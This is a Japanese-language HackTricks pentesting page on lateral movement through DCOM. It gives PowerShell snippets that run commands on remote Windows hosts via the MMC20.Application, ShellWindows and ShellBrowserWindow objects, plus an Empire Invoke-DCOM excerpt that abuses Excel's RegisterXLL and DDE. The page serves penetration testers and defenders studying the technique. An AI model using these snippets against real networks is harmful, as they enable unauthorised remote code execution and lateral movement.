# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有する**ために、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象の範囲を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM**（分散コンポーネントオブジェクトモデル）オブジェクトは、オブジェクトを**ネットワーク上で相互作用**させることができるため、**興味深い**です。Microsoftは、DCOMに関する[こちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)とCOMに関する[こちら](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)で良いドキュメントを提供しています。PowerShellを使用して、`Get-CimInstance Win32_DCOMApplication`を実行することで、DCOMアプリケーションの一覧を取得できます。

[MMC Application Class（MMC20.Application）](https://technet.microsoft.com/en-us/library/cc181199.aspx) COMオブジェクトは、MMCスナップイン操作のコンポーネントをスクリプト化することができます。このCOMオブジェクト内の異なるメソッドとプロパティを列挙しているときに、Document.ActiveViewの下に`ExecuteShellCommand`というメソッドがあることに気付きました。

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

このメソッドについては[こちら](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)で詳しく読むことができます。これまでに、ネットワーク経由でアクセスでき、コマンドを実行できるDCOMアプリケーションがあります。最後のピースは、このDCOMアプリケーションとExecuteShellCommandメソッドを利用して、リモートホストでコードを実行することです。

幸いなことに、管理者としては、PowerShellを使用してDCOMとリモートで対話することができます。`[activator]::CreateInstance([type]::GetTypeFromProgID`を使用するだけで、DCOM ProgIDとIPアドレスを指定する必要があります。それにより、リモートでそのCOMオブジェクトのインスタンスが提供されます。

![](<../../.gitbook/assets/image (665).png>)

その後、`ExecuteShellCommand`メソッドを呼び出して、リモートホストでプロセスを開始することができます。

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

**MMC20.Application**オブジェクトには明示的な「[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)」がなく、デフォルトの許可セットでは管理者がアクセスできるようになっています。

![](<../../.gitbook/assets/image (4) (1) (2).png>)

[@tiraniddo](https://twitter.com/tiraniddo)の[OleView .NET](https://github.com/tyranid/oleviewdotnet)を使用すると、明示的なLaunchPermissionが設定されていない他のオブジェクトを表示できます。この場合、明示的なLaunch Permissionがないすべてのオブジェクトに絞り込むことができます。そうすると、`ShellBrowserWindow`と`ShellWindows`という2つのオブジェクトが目立ちました。

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

潜在的なターゲットオブジェクトを特定する別の方法は、`HKCR:\AppID\{guid}`のキーから値`LaunchPermission`が欠落しているかどうかを確認することです。Launch Permissionsが設定されているオブジェクトは、データがバイナリ形式でオブジェクトのACLを表している以下のようになります。

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

明示的なLaunchPermissionが設定されていないオブジェクトは、特定のレジストリエントリが欠落している状態になります。

### ShellWindows

最初に調査したオブジェクトは[ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)です。このオブジェクトには[ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx)が関連付けられていないため、[Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NETメソッドと[Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx)メソッドを使用して、リモートホスト上のAppIDを介してオブジェクトをインスタンス化することができます。これを行うためには、ShellWindows
CLSIDを取得したので、リモートターゲット上でオブジェクトをインスタンス化することができます。
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)

リモートホスト上でオブジェクトがインスタンス化されると、それに対してインターフェースを作成し、任意のメソッドを呼び出すことができます。オブジェクトへの返されたハンドルには、いくつかのメソッドとプロパティが表示されますが、それらとは対話することはできません。実際にリモートホストと対話するためには、[WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) メソッドにアクセスする必要があります。このメソッドは、Windowsシェルウィンドウを表すオブジェクトを返します。
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)

シェルウィンドウの完全なハンドルを持っていると、公開されているすべての予想されるメソッド/プロパティにアクセスできます。これらのメソッドを調べた結果、**`Document.Application.ShellExecute`** が目立ちました。メソッドのパラメータ要件に従ってください。パラメータ要件は[こちら](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx)でドキュメント化されています。
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)

上記のように、私たちのコマンドはリモートホストで正常に実行されました。

### ShellBrowserWindow

この特定のオブジェクトはWindows 7に存在せず、Win7-Win10で成功裏にテストされた「ShellWindows」オブジェクトよりも、横方向の移動には制限があります。

このオブジェクトの列挙に基づいて、前のオブジェクトと同様にエクスプローラーウィンドウへのインターフェースを提供するようです。このオブジェクトをインスタンス化するには、そのCLSIDを取得する必要があります。上記と同様に、OleView .NETを使用できます。

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

再び、空白の起動許可フィールドに注意してください。

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

CLSIDを使用して、前のオブジェクトで行った手順を繰り返し、オブジェクトをインスタンス化し、同じメソッドを呼び出すことができます。
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)

上記のように、コマンドはリモートターゲットで正常に実行されました。

このオブジェクトはWindowsシェルと直接連携しているため、前のオブジェクトと同様に「ShellWindows.Item」メソッドを呼び出す必要はありません。

これらの2つのDCOMオブジェクトは、リモートホストでシェルコマンドを実行するために使用できますが、他にもリモートターゲットの列挙や改ざんに使用できる興味深いメソッドがたくさんあります。これらのメソッドには次のものがあります：

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE＆RegisterXLL

同様の方法で、DCOM Excelオブジェクトを悪用して横方向に移動することも可能です。詳細については、[https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)を参照してください。
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## ツール

Powershellスクリプト[**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)は、他のマシンでコードを実行するためのさまざまな方法を簡単に呼び出すことができます。

## 参考文献

* 最初の方法は[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)からコピーされました。詳細についてはリンクを参照してください。
* 2番目のセクションは[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)からコピーされました。詳細についてはリンクを参照してください。

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

重要な脆弱性を見つけて、より迅速に修正できるようにしましょう。Intruderは攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
